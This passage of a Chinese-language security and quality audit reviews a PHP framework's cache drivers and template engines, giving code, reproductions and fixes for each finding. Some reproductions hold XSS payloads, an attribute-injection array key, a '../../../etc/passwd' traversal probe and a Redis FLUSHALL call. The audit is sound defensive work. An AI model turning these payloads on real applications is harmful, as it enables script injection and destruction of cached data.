② 锁 TTL 改为可配置（`'lock_ttl' => 30`），并在 `remember()` 文档中明确"不保证回调只执行一次"。③ 兜底路径改为"最后一次长等待 + 仍失败则回退到旧值"，避免无条件重复执行。

---

### [中] MV-05 `MemcachedCache::increment()/decrement()` 对 `serialize()` 写入的值必然走非原子回退，且重置 TTL
- 文件: `app/cache/MemcachedCache.php` 行号: 166-223
- 代码:
```php
$result = $this->memcached->increment($fullKey, $step);   // 期望原子
if ($this->memcached->getResultCode() === \Memcached::RES_SUCCESS) { return (int) $result; }
if ($this->memcached->getResultCode() === \Memcached::RES_NOTFOUND) { ... }
// 回退到非原子方式
$value = $this->memcached->get($fullKey);
$current = is_string($value) ? (int) $this->unserialize($value) : (is_int($value) ? $value : 0);
$new = $current + $step;
$this->memcached->set($fullKey, $this->serialize($new), $this->defaultTtl);   // TTL 被重置
```
- 问题: `set()`（75-88 行）对所有值统一 `serialize()`，写入的是 `i:5;` 之类的**序列化字符串**，而 Memcached 原生 `increment()` 只接受纯数字载荷。因此对任何通过 `set()` 写入的键，`increment()` 必然返回 `RES_CLIENT_ERROR`（E_BAD_NUMBER）而非 `RES_NOTFOUND`，代码落入最后的非原子回退分支 → **读-改-写三步非原子**，并发下丢失更新。`FileCache` 有 `flock`、`RedisCache` 至少还有 `INCRBY` 可用，唯独 Memcached"看起来原子、实际不原子"，最具迷惑性。此外回退分支把 TTL 重置为 `$this->defaultTtl`，**计数器永不过期**（每次自增都续期），与 FileCache/RedisCache 保留原剩余 TTL 的行为（407、438 行）不一致，会造成长期堆积的热 key。
- 触发场景: 计数器先 `set()` 后 `increment()` 的常见写法：
```php
$cache->set('quota', 100, 3600);        // 写入 serialize('i:100;')
$cache->increment('quota');             // 走非原子回退，TTL 被重置为 3600
// 并发 20 次 → 结果可能 < 20；且每次调用都会把 TTL 续到 3600，key 永不释放
```
- 建议修复: 让计数器键走**无序列化的纯数字**通道，与 `set()` 的序列化路径区分：
```php
private function counterKey(string $key): string
{
    return $this->key('cnt:' . hash('sha256', $key));
}

public function increment(string $key, int $step = 1): int
{
    $ck = $this->counterKey($key);
    $r = $this->memcached->increment($ck, $step, $this->defaultTtl, $step);   // 原子 + 初始化
    if ($this->memcached->getResultCode() === \Memcached::RES_SUCCESS) { return (int) $r; }
    error_log('MemcachedCache: increment failed: ' . $this->memcached->getResultMessage());
    return 0;
}
```
或至少在回退分支中**不再重置 TTL**，并在文档中说明计数器应通过 `increment()` 初始化而非 `set()`。

### [中] MV-06 TTL 语义：`0` 与负数均表示"永久"，且 `defaultTtl=0` 时所有键永不过期
- 文件: `app/cache/FileCache.php` 行号: 37、85-88、144-153；`app/cache/RedisCache.php` 行号: 104-112；`app/cache/MemcachedCache.php` 行号: 77-85
- 代码:
```php
private function isExpired(array $data): bool
{
    return isset($data['expire']) && $data['expire'] > 0 && $data['expire'] < time();
}
// write()
'expire' => $ttl > 0 ? time() + $ttl : 0,     // 0 与负数都写成 0
```
- 问题: 三个驱动在 `ttl <= 0` 时统一按"永久"处理，这一选择本身自洽，但存在三个易踩的陷阱：① **语义与主流框架相反**，Laravel/PHP 生态中 `Cache::put($k,$v,0)` 往往表示"使用默认 TTL"或"立即过期"，此处却是永久；`CacheInterface::set()` 的文档（第 9 行）完全没有说明 `0` 与负数的含义。② **负数被静默接受为永久**，`set($k,$v,-5)` 不报错也不过期，调用方以为"负数=已过期"时会造成数据永久驻留。③ `defaultTtl` 若被误配为 `0`（如 `'expire' => env('CACHE_TTL', 0)`），则 `set($k,$v)` 的所有键**永久不过期**，缓存目录无限增长。实测确认：
```php
$c = new cache\FileCache(STORAGE_PATH.'cache');
$c->set('t0', 'v', 0); $c->set('tneg', 'v', -5); $c->set('tnull', 'v');
// 实测磁盘内容： set(...,0)  → {"value":"v","expire":0,...}
//                set(...,-5) → {"value":"v","expire":0,...}
//                has(t0)=true  has(tneg)=true  —— 两者均永不过期
```
- 建议修复: ① 在 `CacheInterface::set()` 的 PHPDoc 中明确三态语义：`null` = 用默认 TTL、`0` = 永不过期、负数 = 非法；② 对负数显式拒绝：
```php
if ($ttl !== null && $ttl < 0) {
    throw new \InvalidArgumentException("Cache TTL must be null (default) or >= 0, got {$ttl}");
}
```
③ 构造函数对 `expire` 配置做校验，`0` 需显式标注"永久"意图（建议改用 `null` 或 `'forever'` 表达），避免误配。

---

### [中] MV-07 `FileCache::deleteMany()`/`clear()` 恒返回 `true`，`many()` 无法区分"缺失"与"值为 null"
- 文件: `app/cache/FileCache.php` 行号: 240-246、253-277、285-292
- 代码:
```php
public function deleteMany(array $keys): bool
{
    foreach ($keys as $key) { $this->delete($key); }   // 返回值被丢弃
    return true;
}
public function clear(): bool { /* ... */ return true; }
public function many(array $keys): array
{
    $results = [];
    foreach ($keys as $key) { $results[$key] = $this->get($key); }   // 缺失键 → null
    return $results;
}
```
- 问题: ① `deleteMany()`/`clear()` 恒返回 `true`，磁盘满、权限不足、文件被占用（Windows）导致的删除失败**完全不可观测**，调用方（包括 `TaggedCache::flush()` 的调用链）会误以为清理成功。② `many()` 对不存在的键返回 `null`，与"键存在但值为 null"无法区分，调用方必须逐个再 `has()` 二次确认。③ `deleteMany()` 逐个删除且每次都触发 `file_exists()`，N 个键就是 N 组系统调用，无批量优化。
- 触发场景:
```php
$c = new cache\FileCache(STORAGE_PATH.'cache');
$c->set('a', 'v', 60);
var_dump($c->many(['a', 'missing']));    // 实测： ['a'=>'v','missing'=>null]  ← 无法区分
var_dump($c->deleteMany(['x','y','z'])); // 实测： true（即便文件不存在或删除失败）
```
- 建议修复: 汇总真实结果：
```php
public function deleteMany(array $keys): bool
{
    $ok = true;
    foreach ($keys as $key) {
        $file = $this->getFile((string) $key);
        if (!file_exists($file)) { continue; }
        $ok = @unlink($file) && $ok;
        if (!$ok) { error_log("FileCache: failed to delete '{$key}'"); }
    }
    return $ok;
}

public function clear(): bool
{
    $ok = true;
    foreach ([$this->path.'*.cache', $this->path.'tag_*.json', $this->path.'*.lock'] as $pat) {
        foreach (@glob($pat) ?: [] as $f) { $ok = @unlink($f) && $ok; }
    }
    return $ok;
}
```
`many()` 则在文档中明确"缺失键返回 null"，或增加返回 `['value' => ..., 'hit' => bool]` 的变体。

### [中] MV-08 `CacheManager::resolve()` 配置缺失被静默兜底；未知 store 名报错信息误导
- 文件: `app/cache/CacheManager.php` 行号: 45-54、105-122
- 代码:
```php
private function resolve(string $name): CacheInterface
{
    if (isset($this->customCreators[$name])) {
        return $this->customCreators[$name]();          // 未传入任何配置
    }
    $storeConfig = $this->config[$name] ?? [];
    $driver = $storeConfig['driver'] ?? $name;
    return match ($driver) {
        'file'      => new FileCache($storeConfig),     // 缺 path → STORAGE_PATH.'cache'
        ...
        default     => throw new \InvalidArgumentException("Unsupported cache driver: {$driver}. ..."),
    };
}
```
- 问题: ① **配置缺失被静默兜底**：若 `stores` 中某个 file store 忘了写 `path`，`FileCache` 会回退到 `STORAGE_PATH.'cache'`（构造函数第 36 行），与默认 store 共用目录；叠加 HV-11 的无前缀问题，这两个 store 互相污染且 `clear()` 互相清空，配置错误要到运行期才暴露。② **未知 store 名的报错信息误导**：`stores` 中根本没有该名字时，`$storeConfig` 为空数组，`$driver` 回退为 `$name`，报错变成 `Unsupported cache driver: <store名>`，把"store 未配置"误报为"驱动不支持"，排障方向被带偏。③ **自定义创建器拿不到配置**：`extend()` 的回调是无参 callable，自定义驱动（`array`/`apcu`/`dynamodb`）拿不到 `$storeConfig`，只能靠闭包外部捕获。④ `driver()` 解析后的实例永久缓存，无 `forget()`，测试中切换配置需重建 `CacheManager`。
- 触发场景:
```php
$cm = new cache\CacheManager(['default' => 'file', 'stores' => ['file' => ['driver' => 'file']]]);
$cm->driver('file');   // 静默使用 STORAGE_PATH.'cache'，与默认 store 同目录
$cm->driver('typo');   // 报错： Unsupported cache driver: typo（实为 store 未配置）
```
- 建议修复: 让配置错误显式失败并把配置透传给自定义创建器：
```php
private function resolve(string $name): CacheInterface
{
    if (!isset($this->config[$name]) && !isset($this->customCreators[$name])) {
        throw new \InvalidArgumentException(
            "Cache store [{$name}] is not defined in config('cache.stores'); defined: "
            . implode(', ', array_keys($this->config))
        );
    }
    $storeConfig = $this->config[$name] ?? [];
    if (isset($this->customCreators[$name])) {
        return ($this->customCreators[$name])($storeConfig, $name);   // 透传配置
    }
    $driver = $storeConfig['driver'] ?? $name;
    if ($driver === 'file' && !isset($storeConfig['path'])) {
        throw new \InvalidArgumentException("Cache store [{$name}] of driver 'file' must define 'path'");
    }
    return match ($driver) { /* ... */ };
}

public function forget(?string $name = null): void { /* 释放已解析实例，便于测试与配置热更新 */ }
```

---

### [中] MV-09 `CacheManager::__call()` 绕过接口约束，可经门面触达驱动原生连接
- 文件: `app/cache/CacheManager.php` 行号: 131-142；`app/cache/Cache.php` 行号: 8-25
- 代码:
```php
public function __call(string $method, array $args): mixed
{
    $driver = $this->driver();
    if (!method_exists($driver, $method)) {
        throw new \BadMethodCallException(...);
    }
    return $driver->$method(...$args);
}
```
- 问题: ① **约束被架空**：`CacheInterface` 只定义了 13 个方法，`__call` 却允许把**任意公有方法**透传到驱动，包括 `RedisCache::connection()`（440 行）与 `MemcachedCache::connection()`（334 行）。于是 `Cache::connection()` 能从门面拿到原生客户端并执行任意命令（`FLUSHALL`、`CONFIG SET`、`DEBUG SLEEP`），缓存层成了后门通道，且这条路径绕过了 `clear()` 的作用域限制（CV-03）。② **门面 docblock 与实现不同步**：`Cache.php` 的 `@method` 列表缺少 `flushByTag()`、`attachTag()`。③ `method_exists()` 检查发生在 `driver()` **之后**，即已建立网络连接之后才发现方法不存在，错误路径白白付出连接代价。
- 触发场景:
```php
Cache::connection()->flushall();                    // 清空整台 Redis，而 clear() 只会按前缀删
Cache::connection()->set('arbitrary', 'x', 3600);   // 写入无前缀的裸键
Cache::notARealMethod('x');                         // 先建连接，再抛 BadMethodCallException
```
- 建议修复: 把透传限制在接口白名单内，并把 `connection()` 移出门面路径：
```php
private const PASSTHROUGH = [
    'get','set','has','delete','clear','remember','increment','decrement',
    'many','setMany','deleteMany','pull','tags','flushByTag','attachTag',
];

public function __call(string $method, array $args): mixed
{
    if (!in_array($method, self::PASSTHROUGH, true)) {
        throw new \BadMethodCallException("Cache method [{$method}] is not available through CacheManager");
    }
    return $this->driver()->$method(...$args);
}
```
`connection()` 仅在需要时通过 `CacheManager::driver('redis')` 显式调用，并在文档中标注为高级/危险 API。

---

### [中] MV-10 `CacheInterface` 硬依赖 `\cache\TaggedCache`，契约层与应用层循环耦合
- 文件: `app/core/contract/CacheInterface.php` 行号: 23-32
- 代码:
```php
interface CacheInterface
{
    /**
     * 获取标签化缓存实例
     * @param string[] $tags
     */
    public function tags(array $tags): \cache\TaggedCache;   // 契约引用了具体实现命名空间
    public function flushByTag(string $tag): bool;
    public function attachTag(string $key, string $tag): void;
}
```
- 问题: `core\contract` 位于框架最底层（`AGENTS.md` 明确 `app/core/` 为框架内核），却在其签名中直接引用应用层命名空间 `\cache\TaggedCache`。后果：① 契约不再是纯粹的存储抽象，无法被第三方的 memory/array 驱动在不引入 `cache` 命名空间的情况下实现；② 与 `TaggedCache` 之间形成隐性双向依赖（`TaggedCache::__construct(CacheInterface $store, ...)` 反过来依赖接口），使依赖图出现环；③ `tags()`/`flushByTag()`/`attachTag()` 是**标签化能力**，并非所有缓存存储都天然支持（如纯内存数组驱动），却被强制写入基础契约。
- 触发场景: 编写一个与框架无关的最小驱动时：
```php
class MemoryStore implements \core\contract\CacheInterface {
    public function tags(array $tags): \cache\TaggedCache { /* 被迫依赖应用层 */ }
}
```
- 建议修复: 抽出标签能力的独立契约，`CacheInterface` 只保留基础读写：
```php
namespace core\contract;

interface TaggableStoreInterface
{
    public function tags(array $tags): TaggableCacheInterface;
    public function flushByTag(string $tag): bool;
    public function attachTag(string $key, string $tag): void;
}

interface TaggableCacheInterface
{
    public function get(string $key, mixed $default = null): mixed;
    public function set(string $key, mixed $value, ?int $ttl = null): bool;
    // ...标签缓存所需的最小集合
}
```
`TaggedCache` 依赖 `TaggableCacheInterface`（或直接在构造时接收 store 实例），从而彻底切断 `core` → `cache` 的反向依赖。

### [中] MV-11 Blade `@each` 不在编译期校验路径、不支持索引变量，非法路径每次渲染都触发 warning
- 文件: `app/view/Blade.php` 行号: 439-457（`compileEach`）、603-618（`resolveInclude`）
- 代码:
```php
if (count($parts) < 3) { return $match[0]; }   // 参数不足 → 原样输出文本到页面
// @include 在编译期做 realpath 前缀校验，@each 完全跳过
return '<?php foreach ((array)(' . $items . ') as $__key => $' . $var . '): ?>'
     . '<?php $__inc_each = $__blade->resolveInclude(\'' . addslashes($view) . '\'); ...';
```
- 问题: ① **编译期无路径校验**：`@include`（416-423 行）在编译期做 `realpath` 前缀校验并在越界时替换为空串，而 `@each` 跳过该校验，改由运行期 `resolveInclude()` → `compile()` 触发 `trigger_error` —— 该错误在**每次渲染**都会重复打出，永久污染日志。② **不支持第 4/5 个参数**：Laravel 的 `@each($view, $data, $iterator, $key)` 支持索引变量与空集合兜底视图，本实现固定使用 `$__key`、忽略 `$empty`。③ **参数不足时输出字面量**：`< 3` 个参数时 `return $match[0]`，`@each(...)` 原文被当作 HTML 输出到页面（而非编译错误），问题被彻底掩盖。
- 触发场景:
```php
file_put_contents("$dir/evil.blade.php", "@each('../../../etc/passwd', [1], 'x')");
echo "result=[" . @$b->render('evil') . "]";
// 实测： result=[]        —— 路径越界被拦截（安全），但每次渲染都会触发 E_USER_WARNING
```
```php
file_put_contents("$dir/typo.blade.php", "@each('row', $items)X");
// 实测： 页面输出字面量 "@each('row', $items)X"，无任何报错
```
- 建议修复: 与 `@include` 对齐，在编译期校验并补齐参数支持：
```php
if (count($parts) < 3) {
    throw new \RuntimeException('Blade: @each requires at least 3 arguments');
}
[$view, $items, $var] = $parts;
$keyVar = count($parts) > 3 ? trim($parts[3], "'\"") : '__key';
$empty  = $parts[4] ?? null;   // @each 的 empty 兜底视图

$sourcePath = $this->templatePath . trim($view, "'\"") . '.blade.php';
$real = realpath(dirname($sourcePath));
$base = realpath($this->templatePath);
if ($real === false || $base === false
    || ($real !== $base && !str_starts_with($real, $base . DIRECTORY_SEPARATOR))) {
    throw new \RuntimeException("Blade: @each path traversal detected: {$view}");
}
```
并生成带 `if/else` 的循环以支持 `$empty` 兜底视图。

---

### [中] MV-12 Blade 的 `clear()`/`restoreState()`/`includeView()` 不重置 push/prepend 栈
- 文件: `app/view/Blade.php` 行号: 588-598（`includeView`）、620-640（`clear`/`restoreState`）、84-108（`render`）
- 代码:
```php
public function clear(): void
{
    $this->sections = [];
    $this->stack = [];
    // pushStack / prependStack 未重置
}

public function restoreState(array $sections, array $stack): void
{
    $this->sections = $sections;
    $this->stack = $stack;
    // pushStack / prependStack 未恢复
}
```
- 问题: `@push`/`@prepend` 的内容栈在 `@include` 前后**不参与状态保存与恢复**，被包含模板中 `@push('scripts')` 产生的内容会持续累积，并出现在**所有后续** `@stack('scripts')` 的输出位置（包括与该 push 无关的模板）。`render()` 每次会重置（86-89 行），但同一次渲染中多次 `@include` 之间会互相污染；`includeView()`（588-598 行）只快照 sections/stack，同样遗漏 push 栈。这与 sections 被严格快照/恢复的设计不对称，是隐蔽的内容串扰来源。
- 触发场景:
```php
file_put_contents("$dir/inc3.blade.php",  "@push('scripts')INNER@endpush");
file_put_contents("$dir/parent3.blade.php", "@include('inc3')@include('inc3')@stack('scripts')|");
echo $b->render('parent3');
// 实测： INNERINNER|   —— 同一次渲染内两个 include 的 push 全部堆积到同一个 @stack 输出，
//        且无法通过 restoreState 隔离
```
- 建议修复: 将 push/prepend 栈纳入快照与恢复：
```php
public function getState(): array
{
    return [$this->sections, $this->stack, $this->pushStack, $this->prependStack];
}

public function restoreState(array $state): void
{
    [$this->sections, $this->stack, $this->pushStack, $this->prependStack] = $state;
}

public function clear(): void
{
    $this->sections = [];
    $this->stack = [];
    $this->pushStack = [];
    $this->prependStack = [];
}
```
`compileIncludes` 生成的代码相应改为 `$__prevState_N = $__blade->getState(); ... $__blade->restoreState($__prevState_N);`。

---

### [中] MV-13 `View::escapeArray()` 不转义数组键，也不处理对象属性
- 文件: `app/view/View.php` 行号: 160-175
- 代码:
```php
foreach ($data as $key => $value) {
    if (is_array($value)) { $escaped[$key] = $this->escapeArray($value); }
    elseif (is_string($value)) { $escaped[$key] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8'); }
    elseif ($value instanceof \Stringable) { $escaped[$key] = htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8'); }
    else { $escaped[$key] = $value; }
}
```
- 问题: ① **数组键不转义**：攻击者可控的数组键（表单字段名、动态属性名）若被模板直出到属性或标签名中，仍可注入。② **对象属性不处理**：只对 `is_array()` 递归，对 `stdClass`、ORM 模型对象、Collection 完全跳过 —— 而这恰恰是最常见的模型列表场景（`foreach ($users as $user) { echo $user->name; }`），**自动转义在此完全失效**，只剩模板作者自觉调用 `e()`。③ 由于 `escapeArray` 对对象"放行"，HV-07 所说的"渲染前转义"策略实际上只覆盖了标量与数组，覆盖率远低于文档给人的印象。
- 触发场景:
```php
// 模型对象属性 —— 自动转义不生效
file_put_contents("$dir/u.php", "<?= \$user->bio ?>");
$v->render('u', ['user' => (object) ['bio' => '<script>alert(1)</script>']]);
// 输出： <script>alert(1)</script>   —— escapeArray 未递归对象
```
```php
// 可控数组键
file_put_contents("$dir/k.php", "<?php foreach (\$attrs as \$k => \$v): ?><div data-<?= \$k ?>=\"1\"></div><?php endforeach; ?>");
$v->render('k', ['attrs' => ['x" onmouseover="alert(1)' => 'v']]);
// 输出： <div data-x" onmouseover="alert(1)="1"></div>   —— 键未转义，属性注入
```
- 建议修复: 随 HV-07 的"输出时转义"改造一并解决；若保留自动转义，则扩展覆盖面：
```php
$escaped[$isStringKey ? htmlspecialchars($key, ENT_QUOTES, 'UTF-8') : $key] = match (true) {
    is_array($value)             => $this->escapeArray($value),
    is_string($value)            => htmlspecialchars($value, ENT_QUOTES, 'UTF-8'),
    $value instanceof \Stringable => htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8'),
    $value instanceof HtmlString  => (string) $value,   // 显式声明原始 HTML
    default                      => $value,
};
```
更彻底的方案是引入 `HtmlString` 值对象：默认全转义，需原样输出时用 `Helper::raw()` 包裹 —— 与 Blade 的 `{!! !!}` 语义一致，也便于迁移。

### [中] MV-14 `SmartyView` 区块基于单值而非栈，异常路径泄漏 ob 缓冲，长驻进程下状态残留
- 文件: `app/view/SmartyView.php` 行号: 11-13、29-53、69-94
- 代码:
```php
private ?string $sectionBlock = null;      // 单值，非栈

public function section(string $name): void
{
    $this->sectionBlock = $name;
    if (!ob_start()) { $this->sectionBlock = null; return; }
}

public function endsection(): void
{
    if ($this->sectionBlock !== null) {
        $content = ob_get_clean();
        $this->sections[$this->sectionBlock] = $content;
        $this->smarty->assign($this->sectionBlock, $content);
        $this->sectionBlock = null;        // 内层 endsection 会清掉外层状态
    }
}
```
- 问题: ① **嵌套区块错乱**：与 `View` 的 HV-08 同源，内层 `section()` 覆盖 `$sectionBlock`，第一个 `endsection()` 关闭外层缓冲并清空状态，第二个直接 return → 外层内容丢失。② **异常时 ob 缓冲泄漏**：`section()` 与 `endsection()` 之间若模板抛异常，没有任何 `try/finally` 回收缓冲，整段内容被困在未关闭的缓冲区并吞掉后续输出（与 HV-01 同型）。③ **长驻进程下状态残留**：`display()` 仅清理 `$this->sections` 里已知的名字（32-34 行），而 `fetch()`（55-61 行）注册的 assign、以及 `_content_`、`$this->layout` 都不清理 —— 队列/RoadRunner 等复用实例的场景下，上一次渲染的数据会出现在下一次响应中。④ **layout 一次性消费**：`display()` 在 45 行把 `$this->layout` 置空，同一实例第二次 `display()` 会丢失布局。
- 触发场景:
```php
// 模板在 section 与 endsection 之间抛异常
// templates/broken.tpl： {$__view->section('body')}内容{$__view->extend('bad.tpl')}（bad.tpl 内抛异常）
// 结果：ob 缓冲泄漏，后续所有输出被吞没
```
```php
$view = new view\SmartyView(VIEW_PATH);
$view->layout('layouts/app.tpl')->display('a.tpl');   // 布局生效
$view->display('b.tpl');                                // 实测语义：布局失效（已被消费）
```
- 建议修复: 引入栈 + `try/finally` + 渲染后完整重置：
```php
/** @var string[] */
private array $sectionStack = [];

public function section(string $name): void
{
    $this->sectionStack[] = $name;
    ob_start();
}

public function endsection(): void
{
    if ($this->sectionStack === []) { return; }
    $name = array_pop($this->sectionStack);
    $content = (string) ob_get_clean();
    $this->sections[$name] = ($this->sections[$name] ?? '') . $content;
    $this->smarty->assign($name, $content);
}
```
`display()` 应在 `finally` 中统一 `clearAllAssign()` + 清空 sections/sectionStack，并保持 `$this->layout` 不被消费（或提供显式的一次性语义 `layoutOnce()` 并在文档中明示）。

---

### [中] MV-15 缓存目录与编译缓存目录权限不一致，编译产物缺少防直连保护
- 文件: `app/cache/FileCache.php` 行号: 39-43、160-161；`app/view/Blade.php` 行号: 61-63、176；`app/view/Smarty.php` 行号: 29-37
- 代码:
```php
// FileCache：0700 + die 前缀，两项防护
if (!mkdir($this->path, 0700, true) && !is_dir($this->path)) { throw ...; }
$content = '<?php die; ?>' . "\n" . $content;
```
```php
// Blade：0755，产物为裸 PHP，无 die 前缀
if (!is_dir($this->cachePath)) { mkdir($this->cachePath, 0755, true); }
if (file_put_contents($cacheFile, $compiled, LOCK_EX) === false) { trigger_error(...); }
```
- 问题: 同一 `storage/` 树下，缓存数据文件用了 **0700 目录 + `<?php die; ?>` 前缀**双重防护（作者显然考虑过 storage 误暴露为 web 可访问的情形），但 Blade 编译产物与 Smarty 编译/缓存目录都是 **0755 且产物是可直接执行的 PHP**。一旦 Nginx/Apache 的 root 配错到项目根（或 storage 被 alias 出去），攻击者可直接请求 `/storage/views/<sha256>.php`：产物中的 `require`/`$__blade` 未定义会暴露错误信息（`display_errors=On` 时包含服务器绝对路径），更糟的是若模板中存在 `@php`/`{!! !!}` 注入的可控片段，产物即是一段可直接访问的服务端代码。同时 `mkdir()` 的返回值未被检查（Blade 62 行、Smarty 30/33/36 行），目录创建失败时静默继续，后续写盘失败才暴露。
- 触发场景:
```php
// 部署误配：server { root /var/www/app; }   ← 应为 /var/www/app/public
// 攻击者请求：
// GET /storage/views/4f2a...c3.php   → 直接执行编译产物，触发未定义变量错误
```
另：`storage/cache/config_cache.php`、`storage/cache/route_cache.php`（`Application.php:73/178`）同样是裸 PHP 位于 0755 目录，暴露后果相同。
- 建议修复: 统一 storage 下的写入目录权限与产物防护：
```php
// Blade / Smarty
if (!is_dir($this->cachePath) && !mkdir($this->cachePath, 0700, true) && !is_dir($this->cachePath)) {
    throw new \RuntimeException("Blade: cannot create cache dir {$this->cachePath}");
}
```
并在 `storage/` 下放置 `index.html` + `.htaccess`（`Require all denied`）作为兜底；同时在部署文档中强调 web root 必须是 `public/`。产物本身可加前缀 `<?php /* compiled */ if (!defined('LIGHTPHP_ENTRY')) { exit; } ?>` 以在误暴露时至少不执行模板逻辑。

---

### [中] MV-16 `View::normalizePath()` 先 `urldecode()` 再去 `..`，含 `%`/`+` 的合法模板名被破坏
- 文件: `app/view/View.php` 行号: 322-338
- 代码:
```php
private function normalizePath(string $path): string
{
    $path = str_replace('\\', '/', $path);
    $path = urldecode($path);                 // 对整个路径解码
    $path = str_replace("\0", '', $path);
    $path = preg_replace('#/\.\.(/|$)#', '/', $path);
    $path = str_replace('../', '', $path);
    do { $prev = $path; $path = str_replace('../', '', $path); } while ($path !== $prev);
    $path = str_replace('..\\', '', $path);
    return ltrim($path, '/');
}
```
- 问题: 安全上该函数的最终防线其实是 `validatePath()` 的 `realpath` 前缀校验（343-351 行，已验证有效，能拦住 `%2e%2e%2f`、双重编码等变体），因此**穿越本身不成立**（实测 `@each('../../../etc/passwd')` 被拦截、`View::render('../..')` 抛异常）。问题在于这串字符串处理对合法路径有破坏性：① `urldecode()` 作用于整条路径，使模板名中的 `%20`、`%2F`、`+` 被改写（`a+b.php` → `a b.php`、`a%2Fb.php` → `a/b.php`），导致合法模板**找不到**；② `str_replace('../','')` 会误伤形如 `foo..%2Fbar`、或文件名本身含 `..` 的合法目录；③ 三重重复的 `../` 清理（第 328、329、333 行）逻辑重叠且难以推理，其中 `preg_replace('#/\.\.(/|$)#')` 已被后面的 `str_replace` 覆盖。前缀校验已足够，这些字符串手术反而制造了误伤面。
- 触发场景:
```php
// 模板文件实际名为 "50%25 off.php" 或 "a+b.php"
file_put_contents("$dir/a+b.php", "OK");
$v->render('a+b');     // urldecode 后变成 "a b" → RuntimeException: View [a b] not found
```
- 建议修复: 路径规范化只做必要的最小处理，安全交由 `realpath` 前缀校验：
```php
private function normalizePath(string $path): string
{
    $path = str_replace(['\\', "\0"], ['/', ''], $path);
    $path = rawurldecode($path);          // 只解一次编码
    $segments = [];
    foreach (explode('/', $path) as $seg) {
        if ($seg === '' || $seg === '.') { continue; }
        if ($seg === '..') { array_pop($segments); continue; }   // 语义正确的弹栈
        $segments[] = $seg;
    }
    return implode('/', $segments);
}
```
并保持 `validatePath()` 作为唯一强制防线（可再加"拒绝含 `..` 的原始输入"作为快速失败）。

## 四、低危缺陷

### [低] LV-01 `FileCache::write()` 的 `LOCK_EX` 作用于唯一临时文件，等于无效加锁
- 文件: `app/cache/FileCache.php` 行号: 163-171
- 代码:
```php
$tmpFile = $file . '.' . bin2hex(random_bytes(8)) . '.tmp';
if (file_put_contents($tmpFile, $content, LOCK_EX) === false) { return false; }
if (!@rename($tmpFile, $file)) { @unlink($tmpFile); return false; }
```
- 问题: 临时文件名含 8 字节随机十六进制，**天然无并发冲突**，`LOCK_EX` 保护的是一个无人竞争的独占文件，不产生任何互斥效果。真正的原子性来自随后的 `rename()`。该标志属于误导性代码：读者会误以为写路径有锁保护，从而在后续改动中引入竞态。另外 `rename()` 失败时（跨文件系统、目标被 Windows 独占）会 `@unlink($tmpFile)` 静默丢弃本次写入，`set()` 返回 `false`，调用方无日志可查。
- 触发场景: 代码审查/后续维护场景；`rename()` 失败路径无任何可观测输出。
- 建议修复: 移除 `LOCK_EX` 并补注释说明原子性来源，同时为失败加日志：
```php
// 临时文件名唯一，原子性由 rename() 提供，无需 flock
if (file_put_contents($tmpFile, $content) === false) {
    error_log("FileCache: failed to write tmp for '{$key}'");
    return false;
}
if (!@rename($tmpFile, $file)) {
    @unlink($tmpFile);
    error_log("FileCache: failed to publish cache file for '{$key}'");
    return false;
}
```

---

### [低] LV-02 `.lock` 文件只增不减，无独立回收机制
- 文件: `app/cache/FileCache.php` 行号: 74-77、342-343、394-395、426-427
- 代码:
```php
private function getLockFile(string $key): string
{
    return $this->getFile($key) . '.lock';
}
```
- 问题: 每调用一次 `increment()`/`decrement()`/`remember()` 就 `fopen(..., 'c+')` 创建一个 `.lock` 文件。删除键时（配合 CV-08 的修复建议不再删除锁文件）该文件将**永久驻留**；在 key 基数很大的场景（如按 URL 参数缓存）会产生与缓存键数量等量的空文件。`clear()` 是唯一清理入口（且它会误删正在使用的锁，见 CV-08）。
- 触发场景:
```php
$cache->set('ctr', 1, 60);
$cache->increment('ctr');
var_dump(file_exists(STORAGE_PATH.'cache/'.hash('sha256','ctr').'.cache.lock'));
// 实测： true —— 缓存键删除后该文件依然存在
```
- 建议修复: 提供 GC 入口并按 mtime 清理陈旧锁：
```php
public function gcLocks(int $olderThanSeconds = 86400): int
{
    $removed = 0;
    foreach (@glob($this->path . '*.lock') ?: [] as $f) {
        if (time() - (int) @filemtime($f) > $olderThanSeconds && @unlink($f)) { $removed++; }
    }
    return $removed;
}
```
并挂到 CLI 命令（如 `cache:gc`）上定期执行。

---

### [低] LV-03 缓存 key 未做规范化/长度限制，Memcached 驱动会静默写入失败
- 文件: `app/cache/RedisCache.php` 行号: 71-74；`app/cache/MemcachedCache.php` 行号: 45-48
- 代码:
```php
private function key(string $key): string { return $this->prefix . $key; }
```
- 问题: 三个驱动对 key 的约束完全不同，而 `CacheInterface` 未做任何约定或校验：① Memcached 协议禁止 key 含空格与控制字符、长度上限 250 字节，超限会让 `set()` 直接返回 `false`（无日志）；② Redis 允许任意二进制，但 key 中的空格/换行在 RESP 协议下可能导致命令解析异常；③ `FileCache` 因为走 `hash('sha256')` 完全免疫。同一个 key（如 `"user: {$id}"`、超长 key）在 FileCache 正常、在 Memcached 静默失败、在 Redis 可能报错 —— **跨驱动行为完全不可预测**。
- 触发场景:
```php
$cache->set(str_repeat('k', 300), 'v', 60);   // 超过 Memcached 250 字节上限 → 静默 false
$cache->set("user: {$id}", 'v', 60);          // 含空格：Memcached 拒绝 / Redis 可能异常
```
（本机未安装 memcached/redis 扩展，结论基于协议约束与代码路径推演。）
- 建议修复: 在各驱动入口统一规范化：
```php
protected function normalizeKey(string $key): string
{
    $key = str_replace(["\r", "\n", "\0", ' '], '_', $key);   // 去除协议非法字符
    if (strlen($key) > 200) { $key = hash('sha256', $key); }  // 为 prefix 预留余量
    return $key;
}
```
并在 `CacheManager` 入口处调用一次，使所有驱动共享同一套 key 语义。

### [低] LV-04 `TaggedCache::tags()` 不去重、无嵌套深度限制，`delete()` 不摘除标签
- 文件: `app/cache/TaggedCache.php` 行号: 40-43、90-93
- 代码:
```php
public function tags(array $tags): self
{
    return new self($this->store, array_merge($this->tags, $tags));   // 不去重
}

public function delete(string $key): bool
{
    return $this->store->delete($key);      // 不从任何标签中摘除 key
}
```
